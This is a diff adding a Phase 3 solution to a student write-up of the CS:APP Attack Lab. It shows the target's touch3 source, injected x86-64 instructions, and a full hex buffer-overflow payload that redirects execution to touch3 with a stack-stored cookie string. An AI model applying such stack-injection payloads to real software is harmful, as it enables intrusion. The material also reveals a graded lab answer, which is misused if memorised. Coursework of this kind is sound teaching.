@@ -11,6 +11,7 @@ Before starting the lab, read [Writeup](http://csapp.cs.cmu.edu/3e/attacklab.pdf
 > Same as textbook.
 
 ```c
+// when s increase, %rsp address decrease
 char *Gets(char *s) {
     int c;
     char *dest = s;
@@ -107,3 +108,64 @@ ff ff ff ff ff ff ff ff
 ff ff ff ff ff ff ff ff
 78 dc 61 55 00 00 00 00 # the address of our code segment
 ```
+
+### Phase 3
+
+```c
+/* Compare string to hex represention of unsigned value */
+int hexmatch(unsigned val, char *sval) {
+    char cbuf[110];
+    /* Make position of check string unpredictable */
+    char *s = cbuf + random() % 100;
+    sprintf(s, "%.8x", val);
+    return strncmp(sval, s, 9) == 0;
+}
+
+void touch3(char *sval) { // passed in %rdi
+    vlevel = 3; /* Part of validation protocol */
+    if (hexmatch(cookie, sval)) {
+        printf("Touch3!: You called touch3(\"%s\")\n", sval);
+        validate(3);
+    } else {
+        printf("Misfire: You called touch3(\"%s\")\n", sval);
+        fail(3);
+    }
+    exit(0);
+}
+```
+
+We need to store an array to somewhere, very similar to phase 2.
+In order to prevent the string stored in the stack from being destroyed,
+we need to store it safely. Obviously we need to store it in the stack/heap.
+
+The `ret` will pop the return address, so after jumping to `touch3()`,
+the `%rsp` is controlled by `touch3()` & its callees.
+
+We need to store it into [temporary] saved stack. According to CSAPP 3.10.3,
+the saved location is less than `getbuf()`'s stack representing by address value.
+
+```bash
+# ASCII version of cookie
+35 39 62 39 39 37 66 61
+```
+
+```x86_64
+0: 68 fa 18 40 00       	push   $0x4018fa
+5: 48 c7 c7 a8 dc 61 55 	mov    $0x5561dca8,%rdi # the string address, stored in stack bottom of getbuf()
+c: c3                   	ret
+```
+
+So, the answer is:
+
+```bash
+68 fa 18 40 00 48 c7 c7 # 0x5561dc78=0x5561dca0-0x28 (getbuf() allocate memory)
+a8 dc 61 55 c3 00 00 00
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+ff ff ff ff ff ff ff ff
+78 dc 61 55 00 00 00 00 # the address of our code segment; 0x5561dca0
+35 39 62 39 39 37 66 61 # ASCII version of cookie; 0x5561dca0~0x5561dca8
+# string is an array of char, head is '5'/'\35', tail is '\61'; first address is 0x5561dca0
+```
+
+> If we want to read the above hex, we need to read from bottom to top, from left to right.
